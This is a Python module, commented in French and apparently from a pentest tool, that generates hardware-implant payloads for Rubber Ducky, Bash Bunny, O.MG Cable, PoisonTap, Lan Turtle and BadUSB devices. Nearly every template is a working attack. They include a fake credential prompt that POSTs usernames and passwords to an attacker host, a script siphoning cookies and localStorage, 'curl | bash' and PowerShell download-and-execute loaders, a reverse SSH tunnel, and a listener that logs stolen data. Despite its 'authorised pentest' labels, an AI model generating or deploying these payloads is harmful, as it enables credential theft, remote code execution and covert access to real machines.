"""
HardwareImplantService — Génération de payloads pour implants hardware.
BadUSB / Rubber Ducky / Bash Bunny / O.MG Cable / PoisonTap / Lan Turtle.
Simulation : génère des fichiers payload et scripts d'installation.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import string
import time
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

SIMULATION_MODE = os.getenv("SIMULATION_MODE", "true").lower() == "true"
_OUTPUT_DIR = Path("./data/implant_output")
_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


# ── Payload templates ─────────────────────────────────────────────────────────

_DUCKY_EXFIL = """REM Rubber Ducky — Exfiltration credentials Windows
REM PENTEST AUTORISÉ — {target}
DELAY 500
GUI r
DELAY 400
STRING powershell -W Hidden -EP Bypass -Command
ENTER
DELAY 800
STRING $d=Get-Credential -Message 'Authentification réseau requise';
STRING $u=$d.UserName;$p=$d.GetNetworkCredential().Password;
STRING Invoke-WebRequest -Uri 'http://{lhost}:{lport}/c' -Method POST -Body "u=$u&p=$p" -UseBasicParsing;
ENTER
"""

_BASH_BUNNY_EXFIL = """#!/bin/bash
# Bash Bunny — PENTEST AUTORISÉ
# Target: {target}
ATTACKMODE HID STORAGE

LED ATTACK

# Phase 1: Inject credentials exfil
HID_DELAY 1000
HID_EXEC powershell -W Hidden -EP Bypass -Command "Invoke-WebRequest -Uri 'http://{lhost}:{lport}/ping' -Method GET"

LED FINISH
"""

_POISONTAP_PAYLOAD = """// PoisonTap — PENTEST AUTORISÉ
// Target: {target}
var poisonTap = {{
  target: "{target}",
  server: "http://{lhost}:{lport}",
  siphon_cookies: true,
  cache_poison: true,
  trigger: function() {{
    var cookies = document.cookie;
    var x = new XMLHttpRequest();
    x.open("POST", this.server + "/siphon", false);
    x.send(JSON.stringify({{cookies: cookies, url: location.href, localStorage: JSON.stringify(localStorage)}}));
  }}
}};
// Inject HTTPS siphon iframe
var frame = document.createElement("iframe");
frame.src = "http://{lhost}:{lport}/poisonTapCookies";
frame.style.display = "none";
document.body.appendChild(frame);
"""

_OMG_CABLE_PAYLOAD = """-- O.MG Cable Payload — PENTEST AUTORISÉ
-- Target: {target}
-- Callback: {lhost}:{lport}

DELAY 1000
STRING curl -s http://{lhost}:{lport}/stage2 | bash
ENTER
"""

_LAN_TURTLE_CONFIG = {
    "modules": ["autossh", "meterpreter", "responder", "nmap"],
    "ssh_tunnel": "ssh -R {lport}:localhost:22 user@{lhost}",
    "responder_cmd": "python3 /root/responder/Responder.py -I usb0 -w -d",
}


class HardwareImplantService:

    def __init__(self):
        self.simulation_mode = SIMULATION_MODE

    async def generate_rubber_ducky_payload(self, lhost: str, lport: int, payload_type: str = "credentials_exfil", target: str = "target", os_target: str = "windows") -> dict:
        await asyncio.sleep(1)
        payload_content = _DUCKY_EXFIL.format(target=target, lhost=lhost, lport=lport)
        out_dir = _OUTPUT_DIR / f"ducky_{int(time.time())}"
        out_dir.mkdir(exist_ok=True)

        payload_file = out_dir / "inject.txt"
        payload_file.write_text(payload_content)

        readme_file = out_dir / "README.md"
        readme_file.write_text(f"# Rubber Ducky Payload\n\n**Pentest autorisé — Target: {target}**\n\n## Instructions\n\n1. Copier `inject.txt` à la racine de la carte SD\n2. Compiler avec DuckEncoder ou USB Rubber Ducky Encoder v3\n3. Insérer dans machine cible\n\n## Listener\n\n```bash\nnc -lvnp {lport}\n```\n\n## Payload type: {payload_type}\n")

        return {
            "payload_file": str(payload_file),
            "readme_file": str(readme_file),
            "out_dir": str(out_dir),
            "lhost": lhost, "lport": lport,
            "os_target": os_target,
            "payload_type": payload_type,
            "listener_cmd": f"nc -lvnp {lport}",
            "simulation": self.simulation_mode,
        }

    async def generate_bash_bunny_payload(self, lhost: str, lport: int, attack_mode: str = "HID_STORAGE", target: str = "target") -> dict:
        await asyncio.sleep(1)
        payload_content = _BASH_BUNNY_EXFIL.format(target=target, lhost=lhost, lport=lport)
        out_dir = _OUTPUT_DIR / f"bunny_{int(time.time())}"
        out_dir.mkdir(exist_ok=True)

        payload_file = out_dir / "payload.sh"
        payload_file.write_text(payload_content)

        return {
            "payload_file": str(payload_file),
            "out_dir": str(out_dir),
            "attack_mode": attack_mode,
            "lhost": lhost, "lport": lport,
            "install_path": "payloads/switch1/payload.sh",
            "simulation": self.simulation_mode,
        }

    async def generate_omg_cable_payload(self, lhost: str, lport: int, target: str = "target") -> dict:
        await asyncio.sleep(1)
        payload_content = _OMG_CABLE_PAYLOAD.format(target=target, lhost=lhost, lport=lport)
        out_dir = _OUTPUT_DIR / f"omg_{int(time.time())}"
        out_dir.mkdir(exist_ok=True)

        payload_file = out_dir / "payload.txt"
        payload_file.write_text(payload_content)

        return {
            "payload_file": str(payload_file),
            "out_dir": str(out_dir),
            "lhost": lhost, "lport": lport,
            "flash_instructions": "Utiliser O.MG Programmer App pour flasher via WebSerial",
            "simulation": self.simulation_mode,
        }

    async def generate_poisontap_payload(self, lhost: str, lport: int, target: str = "target") -> dict:
        await asyncio.sleep(1)
        payload_content = _POISONTAP_PAYLOAD.format(target=target, lhost=lhost, lport=lport)
        out_dir = _OUTPUT_DIR / f"poisontap_{int(time.time())}"
        out_dir.mkdir(exist_ok=True)

        payload_file = out_dir / "poisontap.js"
        payload_file.write_text(payload_content)

        server_script = out_dir / "server.py"
        server_script.write_text(f"""#!/usr/bin/env python3
# PoisonTap listener server — PENTEST AUTORISÉ
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length)
        print(f"[SIPHONED] {{body.decode()}}")
        with open("siphoned.log", "a") as f:
            f.write(body.decode() + "\\n")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args): pass

HTTPServer(("0.0.0.0", {lport}), Handler).serve_forever()
""")

        return {
            "payload_file": str(payload_file),
            "server_script": str(server_script),
            "out_dir": str(out_dir),
            "lhost": lhost, "lport": lport,
            "server_cmd": f"python3 {server_script}",
            "simulation": self.simulation_mode,
        }

    async def generate_lan_turtle_config(self, lhost: str, lport: int, modules: list = None) -> dict:
        await asyncio.sleep(1)
        if modules is None:
            modules = ["autossh", "responder"]

        config = dict(_LAN_TURTLE_CONFIG)
        config["ssh_tunnel"] = config["ssh_tunnel"].format(lhost=lhost, lport=lport)
        config["lhost"] = lhost
        config["lport"] = lport
        config["enabled_modules"] = modules

        out_dir = _OUTPUT_DIR / f"lan_turtle_{int(time.time())}"
        out_dir.mkdir(exist_ok=True)

        config_file = out_dir / "turtle_config.json"
        config_file.write_text(json.dumps(config, indent=2))

        return {
            "config_file": str(config_file),
            "config": config,
            "out_dir": str(out_dir),
            "simulation": self.simulation_mode,
        }

    async def generate_badusb_payload(self, lhost: str, lport: int, target_os: str = "windows", payload_type: str = "reverse_shell") -> dict:
        await asyncio.sleep(1)
        out_dir = _OUTPUT_DIR / f"badusb_{int(time.time())}"
        out_dir.mkdir(exist_ok=True)

        if target_os == "windows":
            script_content = f"""@echo off
REM BadUSB Payload — PENTEST AUTORISÉ
powershell -W Hidden -EP Bypass -Command "iex (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/s')"
"""
            script_file = out_dir / "payload.bat"
        else:
            script_content = f"""#!/bin/bash
# BadUSB Payload — PENTEST AUTORISÉ
curl -s http://{lhost}:{lport}/s | bash
"""
            script_file = out_dir / "payload.sh"

        script_file.write_text(script_content)

        return {
            "payload_file": str(script_file),
            "out_dir": str(out_dir),
            "target_os": target_os,
            "payload_type": payload_type,
            "listener_cmd": f"python3 -m http.server {lport}",
            "simulation": self.simulation_mode,
        }

    async def list_generated_payloads(self) -> list[dict]:
        payloads = []
        if _OUTPUT_DIR.exists():
            for d in sorted(_OUTPUT_DIR.iterdir(), reverse=True):
                if d.is_dir():
                    files = list(d.iterdir())
                    implant_type = d.name.split("_")[0]
                    payloads.append({
                        "dir": str(d),
                        "name": d.name,
                        "implant_type": implant_type,
                        "file_count": len(files),
                        "files": [f.name for f in files],
                        "created_ts": d.stat().st_mtime,
                    })
        return payloads


hardware_service = HardwareImplantService()
